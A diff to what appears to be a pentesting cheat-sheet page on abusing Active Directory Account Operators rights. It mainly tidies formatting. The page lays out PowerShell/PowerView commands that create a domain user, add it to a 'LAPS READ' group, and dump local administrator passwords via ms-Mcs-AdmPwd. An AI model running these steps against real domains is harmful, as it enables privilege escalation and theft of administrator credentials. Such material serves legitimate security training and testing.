@@ -11,17 +11,11 @@ tags: ["Account Operators", "active driectory", "ad", "Windows", "LAPS", "prives
 
 #### 1. Import PowerView.ps1 
 
-<div>
-
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
-#### 2. Create cred object (runas) \[optional\]
-
-<div>
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -35,55 +29,29 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-</div>
-
-#### 3. Create new user password object
-
-<div>
+#### 3. Create a new user password object
 
 ```console
 $new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force
 ```
 
-</div>
-
-#### 4. Create new user account
-
-<div>
+#### 4. Create a new user account
 
 ```console
-# Create a new user
-New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred
+New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password -Credential $cred
 ```
+
+#### 5. Add the new user to LAPS group
 
 ```console
-# Grant new user privilege (e.g. WinRM)
-Add-DomainGroupMember -Identity WinRM -Members <NEW_USER> -Credential $cred
+Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>' -Credential $cred
 ```
-
-</div>
-
-#### 5. Add new user to LAPS group
-
-<div>
-
-```console
-Add-DomainGroupMember -Identity 'LAPS READ' -Members <NEW_USER> -Credential $cred
-```
-
-</div>
 
 #### 6. Read LAPS password
 
-<div>
-
 ```console
-# Login as new user
+# Run as the new user
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
